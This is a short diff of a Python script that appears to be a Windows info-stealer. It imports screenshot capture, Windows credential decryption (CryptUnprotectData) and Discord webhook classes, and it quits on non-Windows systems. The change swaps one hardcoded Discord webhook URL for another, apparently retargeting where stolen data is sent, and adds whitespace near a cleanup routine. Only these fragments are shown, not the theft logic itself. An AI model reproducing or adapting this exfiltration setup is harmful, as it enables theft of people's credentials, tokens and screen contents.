@@ -19,7 +19,7 @@ from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from pyautogui import screenshot
 from win32crypt import CryptUnprotectData
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/958134235800158249/QwjDxnjuD82SpCnNCRmeTuPAhFMyZhjIw5QzufzlgT8bgidOUY3Lc_4Cm_TgUWjR-qyJ"
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/958778933803888680/iRxdxjwCBC-m2BhXlHfUpRIpLgpFzEonAttNM5xr9r2lu2bZzy8NRyiBOuqmB2I76vOq"
 
 def main(webhook_url):
     global webhook, embed
@@ -419,7 +419,7 @@ def cleanup():
 
         try: clean()
         except: pass        
-    
+                        
 if __name__ == '__main__':
     if os.name != "nt":
         exit()
